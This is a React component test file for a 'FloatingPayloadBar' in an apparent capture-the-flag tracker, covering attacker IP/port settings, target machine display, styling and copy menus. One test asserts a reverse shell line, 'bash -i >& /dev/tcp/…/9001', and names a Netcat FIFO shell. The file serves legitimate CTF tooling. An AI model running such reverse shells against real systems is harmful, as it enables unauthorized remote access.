import React from 'react';
import { render, screen, fireEvent } from '@testing-library/react';
import { describe, it, expect, beforeEach } from 'vitest';
import { FloatingPayloadBar } from './FloatingPayloadBar';
import { useCtfStore } from '../../store/useCtfStore';

describe('FloatingPayloadBar component', () => {
  beforeEach(() => {
    useCtfStore.setState({
      globalVars: {
        lhost: '10.10.14.99',
        lport: '9001',
        targetIp: '10.10.10.200',
        interface: 'tun0',
        customVars: {},
      },
      activeTargetId: null,
      soundEnabled: false,
    });
  });

  it('renders minimized chip with current LHOST and LPORT by default', () => {
    render(<FloatingPayloadBar />);
    expect(screen.getByText('10.10.14.99:9001')).toBeInTheDocument();
  });

  it('expands to full tactical HUD on click', () => {
    render(<FloatingPayloadBar />);
    const chip = screen.getByText('10.10.14.99:9001');
    fireEvent.click(chip);

    expect(screen.getByText('PAYLOAD CONTROLLER')).toBeInTheDocument();
    expect(screen.getByText('LHOST (Attacker)')).toBeInTheDocument();
    expect(screen.getByText('LPORT')).toBeInTheDocument();
    expect(screen.getByDisplayValue('10.10.14.99')).toBeInTheDocument();
    expect(screen.getByDisplayValue('9001')).toBeInTheDocument();
  });

  it('updates globalVars in store when LHOST or LPORT input changes', () => {
    render(<FloatingPayloadBar />);
    // Expand
    fireEvent.click(screen.getByText('10.10.14.99:9001'));

    const lhostInput = screen.getByDisplayValue('10.10.14.99');
    fireEvent.change(lhostInput, { target: { value: '10.10.14.50' } });

    expect(useCtfStore.getState().globalVars.lhost).toBe('10.10.14.50');

    const lportInput = screen.getByDisplayValue('9001');
    fireEvent.change(lportInput, { target: { value: '4444' } });

    expect(useCtfStore.getState().globalVars.lport).toBe('4444');
  });

  it('toggles quick reverse shells drawer and displays interpolated payloads', () => {
    render(<FloatingPayloadBar />);
    // Expand
    fireEvent.click(screen.getByText('10.10.14.99:9001'));

    const toggleBtn = screen.getByText(/Quick 1-Click Reverse Shells/i);
    fireEvent.click(toggleBtn);

    expect(screen.getByText('Bash -i')).toBeInTheDocument();
    expect(screen.getByText('Netcat FIFO')).toBeInTheDocument();
    expect(screen.getByText(/bash -i >& \/dev\/tcp\/10\.10\.14\.99\/9001/)).toBeInTheDocument();
  });

  it('renders active target machine name and IP with proper contrast styling in light mode', () => {
    useCtfStore.setState({
      machines: [
        {
          id: 'test-box',
          name: 'Pickle Rick',
          ip: '10.10.10.42',
          os: 'Linux',
          platform: 'HTB',
          difficulty: 'Easy',
          status: 'backlog',
          tags: ['Web'],
          certifications: [],
          roomUrl: '',
          timeSpentSeconds: 0,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
      ],
      activeTargetId: 'test-box',
    });

    render(<FloatingPayloadBar />);
    const targetName = screen.getByText('Pickle Rick');
    expect(targetName).toBeInTheDocument();
    expect(targetName.className).toContain('text-slate-900');
    expect(targetName.className).toContain('dark:text-white');
    expect(screen.getByText('(10.10.10.42)')).toBeInTheDocument();
  });

  it('contains light mode background and border classes on minimized chip and expanded bar', () => {
    const { container } = render(<FloatingPayloadBar />);
    const chip = container.querySelector('[class*="bg-white/95"]');
    expect(chip).toBeInTheDocument();
    expect(chip?.className).toContain('dark:bg-slate-900/95');
    expect(chip?.className).toContain('border-slate-200/90');

    // Expand
    fireEvent.click(screen.getByText('10.10.14.99:9001'));
    const expandedBar = container.querySelector('[class*="w-[calc(100vw-1.5rem)]"]');
    expect(expandedBar).toBeInTheDocument();
    expect(expandedBar?.className).toContain('bg-white/95');
    expect(expandedBar?.className).toContain('dark:bg-slate-950/95');
  });

  it('opens quick copy menu and allows copying all info and individual fields', () => {
    useCtfStore.setState({
      machines: [
        {
          id: 'htb-included',
          name: 'Included',
          ip: '10.129.1.9',
          os: 'Linux',
          platform: 'HTB',
          difficulty: 'Very Easy',
          status: 'backlog',
          tags: ['Web'],
          certifications: [],
          roomUrl: '',
          timeSpentSeconds: 0,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
      ],
      activeTargetId: 'htb-included',
      globalVars: {
        lhost: '127.0.0.1',
        lport: '4445',
        targetIp: '10.129.1.9',
        interface: 'tun0',
        customVars: {},
      },
    });

    render(<FloatingPayloadBar />);
    const copyMenuBtn = screen.getByLabelText('Open Quick Copy Menu');
    fireEvent.click(copyMenuBtn);

    expect(screen.getByText(/Quick Copy All \/ Fields/i)).toBeInTheDocument();
    expect(screen.getByText(/Copy All Tactical Info/i)).toBeInTheDocument();
    expect(screen.getByText('10.129.1.9')).toBeInTheDocument();
    expect(screen.getAllByText('127.0.0.1:4445').length).toBeGreaterThanOrEqual(1);
    expect(screen.getByText(/export IP=10\.129\.1\.9 LHOST=127\.0\.0\.1 LPORT=4445/i)).toBeInTheDocument();
  });

  it('provides copy all button and shell export in expanded HUD header', () => {
    useCtfStore.setState({
      globalVars: {
        lhost: '127.0.0.1',
        lport: '4445',
        targetIp: '10.129.1.9',
        interface: 'tun0',
        customVars: {},
      },
      activeTargetId: null,
    });

    render(<FloatingPayloadBar />);
    // Expand
    fireEvent.click(screen.getByText('127.0.0.1:4445'));

    expect(screen.getByTitle('Copy All Tactical Info')).toBeInTheDocument();
    expect(screen.getByTitle(/Copy Shell Export/i)).toBeInTheDocument();
  });
});

